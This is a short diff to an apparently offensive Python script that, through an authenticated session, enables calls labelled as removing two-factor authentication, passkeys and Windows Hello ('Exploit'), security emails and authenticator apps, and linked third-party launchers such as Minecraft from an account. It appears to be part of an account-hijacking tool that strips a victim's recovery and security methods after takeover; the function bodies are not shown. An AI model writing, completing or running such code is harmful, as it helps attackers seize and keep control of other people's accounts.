@@ -127,14 +127,14 @@ async def secure(session: httpx.AsyncClient):
     print("[+] - Got AMRP")
 
     # 2FA
-    # await remove2FA(session, apicanary)
+    await remove2FA(session, apicanary)
 
-    # # Pass Keys / Windows Hello Exploit
-    # await removeZyger(session, apicanary)
+    # Pass Keys / Windows Hello Exploit
+    await removeZyger(session, apicanary)
 
-    # # Removes secEmails / Auth Apps
-    # await removeProof(session, apicanary)
-    # print("[+] - Removed all Proofs")
+    # Removes secEmails / Auth Apps
+    await removeProof(session, apicanary)
+    print("[+] - Removed all Proofs")
     
     # Third Partie Launchers (Minecraft, Prism)
     await removeServices(session)   
